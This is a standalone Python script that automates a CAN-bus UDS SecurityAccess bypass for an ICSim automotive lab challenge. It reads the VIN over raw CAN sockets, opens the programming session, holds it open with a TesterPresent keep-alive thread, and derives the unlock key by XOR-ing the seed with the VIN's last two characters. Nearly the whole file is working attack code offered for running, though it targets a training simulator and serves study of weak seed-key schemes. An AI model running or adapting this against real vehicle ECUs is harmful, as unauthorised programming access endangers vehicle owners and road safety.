#!/usr/bin/env python3
"""
Standalone UDS SecurityAccess (0x27) Solver - the "barbhack" challenge
=====================================================================

Automates Challenge 7 of the ICSim lab end-to-end. SecurityAccess is a two-step
seed-key handshake (request a random seed, send back a derived key) that the ECU
only honours inside the Secret/Programming session (0x10 03). The catch that
makes this *very* hard to do by hand: that session AND the seed expire after
just 3.5 seconds of silence (see icsim.c -> `lastDiagTesterPresent + 3500`), so
a human cannot realistically read the seed, compute the key and send it back in
time. This script does the whole dance automatically.

The attack runs in a few clear steps (see SECTION 6 - solve()):

    STEP 1  Open a raw CAN socket to the bus.
    STEP 2  Read the VIN (UDS 0x09 0x02) - its last two characters ARE the key.
    STEP 3  Enter the Secret/Programming session (0x10 03).
    STEP 4  Start a TesterPresent keep-alive so the session never times out.
    STEP 5  Request the seed (0x27 0x01), derive the key, send it (0x27 0x02).
    STEP 6  Check the ECU's answer (0x67 0x02 = unlocked) and tear down.

The key derivation is the "barbhack" algorithm: each seed byte is XOR-ed with
one of the VIN's last two ASCII characters, alternating. For the lab VIN
"WBARBHACKFA149850" that is '5' (0x35) and '0' (0x30) - but this script reads
the VIN live and derives those bytes itself, so it keeps working if the VIN
ever changes.

Adapted from the main automation-scripts project (can_injector/uds_client.py and
can_injector/security/algorithms.py).
"""

from __future__ import annotations

# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 1 · IMPORTS
#  Everything here is from the Python standard library - no python-can, no
#  external packages. The whole attack is plain sockets and a helper thread.
# ═══════════════════════════════════════════════════════════════════════════

import json
import os
import socket
import struct
import threading
import time
from pathlib import Path


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 2 · RAW CAN TRANSPORT  (the lowest layer - bytes on and off the wire)
#
#  Every UDS exchange here is short enough to fit in a single ISO-TP frame
#  (<= 7 payload bytes), except the VIN which arrives as a multi-frame message
#  we reassemble by hand in SECTION 5. We frame everything over a raw CAN_RAW
#  socket instead of the kernel's can_isotp module, because can_isotp is NOT
#  present on Windows/WSL2 while raw CAN_RAW is available everywhere the lab
#  runs. This is the same technique can_injector/uds_client.py uses.
# ═══════════════════════════════════════════════════════════════════════════

_CAN_FMT  = "=IB3x8s"   # struct layout of a CAN frame: can_id, dlc, 3 pad, 8 data
_CAN_SIZE = 16          # size in bytes of one packed frame
_SFF_MASK = 0x7FF       # 11-bit ID mask for the kernel receive filter


def _raw_open(iface: str, recv_id: int) -> socket.socket:
    """Open a raw CAN socket, kernel-filtered to a single response ID. The
    filter means only frames from `recv_id` (the ECU's 0x7E8) reach us, so bus
    noise and our own transmit echoes are ignored automatically."""
    s = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
    flt = struct.pack("=II", recv_id, _SFF_MASK)            # (id, mask) filter pair
    s.setsockopt(socket.SOL_CAN_RAW, socket.CAN_RAW_FILTER, flt)
    s.bind((iface,))
    return s


def _raw_send(sock: socket.socket, can_id: int, data: bytes) -> None:
    """Send one CAN frame. `data` is right-padded to the fixed 8-byte field;
    the dlc we write is the real (unpadded) length."""
    padded = data.ljust(8, b"\x00")[:8]
    sock.send(struct.pack(_CAN_FMT, can_id, len(data), padded))


def _raw_recv(sock: socket.socket, timeout: float):
    """Read one CAN frame. Returns (can_id, dlc, data) or None on timeout."""
    sock.settimeout(timeout)
    try:
        raw = sock.recv(_CAN_SIZE)
    except (socket.timeout, OSError):
        return None
    can_id, dlc, data = struct.unpack(_CAN_FMT, raw)
    return can_id & 0x1FFFFFFF, dlc, bytes(data[:dlc])      # mask off CAN flag bits


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 3 · TERMINAL UI HELPERS  (colours, banners, prompts - cosmetic only)
#  Nothing here touches the CAN bus; it just makes the console readable. Safe to
#  ignore when following the attack logic.
# ═══════════════════════════════════════════════════════════════════════════

class UI:
    class C:
        RED     = "\033[91m"
        GREEN   = "\033[92m"
        YELLOW  = "\033[93m"
        BLUE    = "\033[94m"
        MAGENTA = "\033[95m"
        CYAN    = "\033[96m"
        WHITE   = "\033[97m"
        BOLD    = "\033[1m"
        DIM     = "\033[2m"
        RESET   = "\033[0m"

    @staticmethod
    def col(color: str, text) -> str:
        return f"{color}{text}{UI.C.RESET}"

    @staticmethod
    def banner(text: str, color: str | None = None):
        color = color or UI.C.CYAN
        w = 60
        print(f"\n{color}{'═'*w}{UI.C.RESET}")
        print(f"{color}  {text}{UI.C.RESET}")
        print(f"{color}{'═'*w}{UI.C.RESET}")

    @staticmethod
    def step(n: int, total: int, text: str):
        print(f"\n{UI.C.BOLD}{UI.C.WHITE}[{n}/{total}] {text}{UI.C.RESET}")

    @staticmethod
    def ok(t):   print(f"  {UI.col(UI.C.GREEN,  '✔')} {t}")
    @staticmethod
    def warn(t): print(f"  {UI.col(UI.C.YELLOW, '⚠')} {t}")
    @staticmethod
    def err(t):  print(f"  {UI.col(UI.C.RED,    '✘')} {t}")
    @staticmethod
    def info(t): print(f"  {UI.col(UI.C.CYAN,   '→')} {t}")
    @staticmethod
    def dim(t):  print(f"  {UI.col(UI.C.DIM,    '-')} {t}")

    @staticmethod
    def prompt(text: str, default=None) -> str:
        suffix = f" [{default}]" if default is not None else ""
        try:
            v = input(f"  {UI.C.CYAN}>{UI.C.RESET} {text}{suffix}: ").strip()
        except (KeyboardInterrupt, EOFError):
            return ""
        return v if v else (str(default) if default is not None else "")


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 4 · CONFIGURATION  (interface and CAN IDs)
#  Built-in defaults live in _DEFAULTS. If an inject_config.json sits next to
#  this script, its "interface" and "uds" values are merged on top so you can
#  re-point things without editing code. Hex strings like "0x7E0" are converted
#  to ints automatically.
# ═══════════════════════════════════════════════════════════════════════════

_DEFAULTS: dict = {
    "interface": "vcan0",
    "uds": {
        "tx_id": 0x7E0,            # tester -> ECU  (where we send requests)
        "rx_id": 0x7E8,            # ECU -> tester  (where we listen for replies)
    },
}

_DEFAULT_CONFIG_PATH = Path(__file__).parent / "inject_config.json"


class Config:
    def __init__(self, path: Path | None = None):
        self._path = path or _DEFAULT_CONFIG_PATH
        self._data = self._merge(_DEFAULTS, self._load())   # defaults + JSON overrides

    def _load(self) -> dict:
        # Read the optional JSON file; on any error fall back to pure defaults.
        if self._path.exists():
            try:
                return self._coerce(json.loads(self._path.read_text()))
            except (json.JSONDecodeError, OSError):
                pass
        return {}

    @staticmethod
    def _merge(base: dict, override: dict) -> dict:
        # Deep-merge override into base so nested dicts combine key-by-key.
        out = dict(base)
        for k, v in override.items():
            if isinstance(out.get(k), dict) and isinstance(v, dict):
                out[k] = Config._merge(out[k], v)
            else:
                out[k] = v
        return out

    @staticmethod
    def _coerce(node):
        # Recursively turn "0x.." hex strings from the JSON into real ints.
        if isinstance(node, dict):
            return {k: Config._coerce(v) for k, v in node.items()}
        if isinstance(node, str) and node.startswith("0x"):
            return int(node, 16)
        return node

    @property
    def iface(self) -> str:
        return self._data["interface"]

    @property
    def uds_tx(self) -> int:
        return self._data["uds"]["tx_id"]

    @property
    def uds_rx(self) -> int:
        return self._data["uds"]["rx_id"]


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 5 · THE UDS CLIENT  (request/response + ISO-TP framing)
#
#  A thin wrapper around the raw transport that speaks UDS: it sends a payload
#  as one ISO-TP single frame, then reads the reply - reassembling a multi-frame
#  reply (used by the VIN) when needed. The keep-alive lives here too, because
#  beating the 3.5 s session timeout is the whole reason this attack must be
#  automated.
# ═══════════════════════════════════════════════════════════════════════════

class UdsClient:

    def __init__(self, cfg: Config):
        self._cfg     = cfg
        self._sock    = _raw_open(cfg.iface, cfg.uds_rx)
        self._tp_stop = threading.Event()      # set this to stop the keep-alive
        self._tp_thread: threading.Thread | None = None

    # --- Send one UDS payload as a single ISO-TP frame ---------------------
    def _send(self, payload: bytes):
        # PCI length byte (high nibble 0 = single frame, low nibble = length)
        # followed by the payload - the framing the kernel ISO-TP layer adds.
        _raw_send(self._sock, self._cfg.uds_tx, bytes([len(payload)]) + payload)

    # --- Throw away anything already buffered ------------------------------
    def _drain(self, window: float = 0.05):
        deadline = time.monotonic() + window
        while time.monotonic() < deadline:
            if _raw_recv(self._sock, 0.01) is None:
                break

    # --- Receive and de-frame one UDS reply (handles multi-frame) ----------
    def _recv(self, timeout: float = 1.0) -> bytes | None:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            r = _raw_recv(self._sock, max(0.02, deadline - time.monotonic()))
            if r is None:
                continue
            _cid, _dlc, data = r
            if not data:
                continue
            # Ignore TesterPresent echoes (02 7E ..) so they are never mistaken
            # for the reply we are actually waiting for.
            if len(data) >= 2 and data[0] == 0x02 and data[1] == 0x7E:
                continue
            pci = data[0] >> 4
            if pci == 0x0:                              # single frame
                return data[1:1 + (data[0] & 0x0F)]
            if pci == 0x1:                              # first frame of many
                total   = ((data[0] & 0x0F) << 8) | data[1]
                payload = bytearray(data[2:])
                # Send a flow-control "clear to send" so the ECU streams the rest.
                _raw_send(self._sock, self._cfg.uds_tx, bytes([0x30, 0x00, 0x00]))
                while len(payload) < total and time.monotonic() < deadline:
                    r2 = _raw_recv(self._sock, max(0.02, deadline - time.monotonic()))
                    if r2 and r2[2] and (r2[2][0] >> 4) == 0x2:   # consecutive frame
                        payload.extend(r2[2][1:])
                return bytes(payload[:total])
        return None

    # --- One request, one reply --------------------------------------------
    def request(self, payload: bytes, timeout: float = 1.0) -> bytes | None:
        self._drain()
        self._send(payload)
        return self._recv(timeout)

    # --- TesterPresent keep-alive (runs in its own thread) -----------------
    def keepalive_start(self):
        """Ping TesterPresent (3E 80, suppress-response) every 0.9 s on a second
        raw socket so the Secret session and the seed never time out (the ECU
        drops both after 3.5 s of silence)."""
        if self._tp_thread and self._tp_thread.is_alive():
            return
        self._tp_stop.clear()

        def _loop():
            s = _raw_open(self._cfg.iface, self._cfg.uds_rx)
            try:
                frame = bytes([0x02, 0x3E, 0x80])
                while not self._tp_stop.is_set():
                    try:
                        _raw_send(s, self._cfg.uds_tx, frame)
                    except OSError:
                        break
                    # Sleep in small slices so stopping is responsive.
                    waited = 0.0
                    while waited < 0.9 and not self._tp_stop.is_set():
                        time.sleep(0.05)
                        waited += 0.05
            finally:
                s.close()

        self._tp_thread = threading.Thread(target=_loop, daemon=True)
        self._tp_thread.start()

    def keepalive_stop(self):
        self._tp_stop.set()
        if self._tp_thread:
            self._tp_thread.join(timeout=2)
        self._tp_thread = None

    def close(self):
        self.keepalive_stop()
        try:
            self._sock.close()
        except OSError:
            pass


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 6 · THE ATTACK  (read VIN -> open session -> seed -> key -> unlock)
#
#  solve() drives the whole thing and is annotated with the STEP 1..6 flow from
#  the top of this file. The small helpers above it are its building blocks.
# ═══════════════════════════════════════════════════════════════════════════

def _barbhack_key(seed: bytes, key_chars: bytes) -> bytes:
    """The 'barbhack' key derivation: XOR each seed byte with one of the VIN's
    last two characters, alternating (byte 0 uses the first, byte 1 the second,
    byte 2 the first again, ...). XOR is its own inverse, which is exactly why
    this trivially weak scheme can be reversed - the lesson of the challenge."""
    return bytes(b ^ key_chars[i % len(key_chars)] for i, b in enumerate(seed))


def _read_vin(uds: UdsClient) -> str | None:
    """STEP 2 helper - request the VIN with OBD mode 09 PID 02 and decode the
    printable ASCII out of the (multi-frame) reply."""
    resp = uds.request(bytes([0x09, 0x02]), timeout=2.0)
    if not resp:
        return None
    # Reply looks like: 49 02 01 <17 VIN bytes>. Strip whichever header is present.
    if len(resp) >= 3 and resp[0] == 0x49 and resp[1] == 0x02 and resp[2] == 0x01:
        chunk = resp[3:]
    elif len(resp) >= 2 and resp[0] == 0x49 and resp[1] == 0x02:
        chunk = resp[2:]
    else:
        chunk = resp
    vin = "".join(chr(b) for b in chunk[:17] if 32 <= b <= 126)
    return vin or None


def solve(cfg: Config) -> bool:
    TOTAL = 5

    # ---- STEP 1 · Open the bus -------------------------------------------
    try:
        uds = UdsClient(cfg)
    except OSError as e:
        UI.err(f"Cannot open raw CAN socket on {cfg.iface}: {e}")
        UI.dim(f"Is the interface up?  ip link show {cfg.iface}")
        return False

    try:
        # ---- STEP 2 · Read the VIN; its last two chars are the key bytes --
        UI.step(1, TOTAL, "Reading the VIN (UDS 0x09 0x02)")
        vin = _read_vin(uds)
        if not vin or len(vin) < 2:
            UI.err("No usable VIN returned - is the ICSim simulator running?")
            return False
        key_chars = vin[-2:].encode("ascii", "ignore")
        UI.ok(f"VIN: {UI.col(UI.C.GREEN, vin)}")
        UI.info(f"Key characters (last two of VIN): "
                f"{UI.col(UI.C.CYAN, vin[-2:])} = "
                f"{' '.join(f'0x{b:02X}' for b in key_chars)}")

        # ---- STEP 3 · Enter the Secret/Programming session (0x10 03) ------
        UI.step(2, TOTAL, "Opening the Secret/Programming session (0x10 03)")
        resp = uds.request(bytes([0x10, 0x03]))
        if not (resp and resp[0] == 0x50):
            UI.err(f"Session 0x03 refused (got {resp.hex() if resp else 'no reply'}).")
            return False
        UI.ok("Session 0x03 open - SecurityAccess is now reachable.")

        # ---- STEP 4 · Keep the session alive ------------------------------
        # Without this, the session and the seed both lapse after 3.5 s and a
        # by-hand attack is essentially impossible. The keep-alive removes the
        # time pressure entirely.
        uds.keepalive_start()
        UI.ok("TesterPresent keep-alive running (beats the 3.5 s timeout).")

        # ---- STEP 5 · Seed -> key -> unlock -------------------------------
        UI.step(3, TOTAL, "Requesting the seed (0x27 0x01)")
        resp = uds.request(bytes([0x27, 0x01]))
        if not (resp and len(resp) >= 4 and resp[0] == 0x67 and resp[1] == 0x01):
            UI.err(f"No seed returned (got {resp.hex() if resp else 'no reply'}).")
            return False
        seed = resp[2:]
        UI.ok(f"Seed: {UI.col(UI.C.GREEN, seed.hex().upper())} ({len(seed)} bytes)")

        UI.step(4, TOTAL, "Deriving the key (barbhack: seed XOR last-2-VIN-chars)")
        key = _barbhack_key(seed, key_chars)
        for i, (s, k) in enumerate(zip(seed, key)):
            UI.dim(f"key[{i}] = 0x{s:02X} XOR 0x{key_chars[i % len(key_chars)]:02X} "
                   f"= 0x{k:02X}")
        UI.ok(f"Key:  {UI.col(UI.C.GREEN, key.hex().upper())}")

        UI.step(5, TOTAL, "Sending the key (0x27 0x02) and checking the response")
        resp = uds.request(bytes([0x27, 0x02]) + key)
        if resp and len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            UI.ok(UI.col(UI.C.BOLD, "0x67 0x02 → SecurityAccess UNLOCKED 🔓"))
            return True

        # Anything else: decode the negative response code if we got one.
        if resp and len(resp) >= 3 and resp[0] == 0x7F:
            nrc = {
                0x24: "requestSequenceError (request a fresh seed first)",
                0x33: "securityAccessDenied",
                0x35: "invalidKey (algorithm or key bytes are wrong)",
                0x36: "exceededNumberOfAttempts (locked out - reset the ECU)",
                0x37: "requiredTimeDelayNotExpired (wait, then retry)",
                0x7F: "serviceNotSupportedInSession (need session 0x03)",
            }.get(resp[2], f"NRC 0x{resp[2]:02X}")
            UI.err(f"SecurityAccess refused: {nrc}")
            UI.dim("On the SECURED simulator (--secure) this failure is expected: "
                   "the key is an AES-CMAC the attacker cannot compute.")
        else:
            UI.err(f"Unexpected reply: {resp.hex() if resp else 'no reply'}")
        return False

    finally:
        uds.close()


# ═══════════════════════════════════════════════════════════════════════════
#  SECTION 7 · MAIN  (banner -> confirm -> solve -> verdict)
# ═══════════════════════════════════════════════════════════════════════════

def main():
    cfg = Config()

    os.system("clear")
    UI.banner(f"SecurityAccess Solver - 0x{cfg.uds_tx:03X} → 0x{cfg.uds_rx:03X}", UI.C.BLUE)
    UI.info("Automates Challenge 7: VIN → session 0x03 → seed → key → unlock.")
    UI.info(f"Interface: {cfg.iface}   (make sure ICSim is running on it)")
    print()

    if UI.prompt("Run the attack now?", "y").lower() not in ("y", "yes", ""):
        return

    unlocked = solve(cfg)
    print()
    if unlocked:
        UI.banner("CHALLENGE 7 SOLVED - SecurityAccess unlocked", UI.C.GREEN)
    else:
        UI.banner("SecurityAccess not unlocked - see messages above", UI.C.YELLOW)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        UI.err("Aborted by user.")
